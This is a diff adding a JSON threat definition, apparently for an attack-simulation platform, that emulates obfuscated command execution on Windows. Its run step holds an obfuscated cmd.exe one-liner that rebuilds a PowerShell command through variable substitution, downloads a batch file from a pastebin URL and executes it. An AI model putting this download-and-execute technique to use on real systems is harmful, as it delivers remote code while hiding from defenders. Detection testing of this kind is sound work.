@@ -1,0 +1,36 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Uses variable substitution to download a batch script and execute calc.exe using substitution. ",
+        "display_name": "obfuscated_cmd_execution",
+        "name": "obfuscated_cmd_execution",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--multipart\":10240,\"--secure\":true}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /q /v /c \"set x=looperwhalestuxhugebees&&set b=!x:~3,1!!x:~1,1!!x:~6,1!!x:~4,1!!x:~5,1!she!x:~0,1!!x:~0,1!.e!x:~14,1!e -command !x:~6,1!ge!x:~12,1! -UseBasicParsing -ou!x:~12,1!fil!x:~4,1! !x:~3,1!!x:~1,1!.!x:~19,1!!x:~8,1!!x:~12,1!  \\\"!x:~7,1!!x:~12,1!!x:~12,1!!x:~3,1!s://!x:~3,1!a!x:~22,1!te!x:~19,1!in.c!x:~2,1!m/!x:~5,1!a!x:~6,1!/vptSeT8Q\\\"&&!b!&&set b=!x:~3,1!!x:~1,1!.!x:~19,1!!x:~8,1!!x:~12,1!&&!b!\"",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--shutdown",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
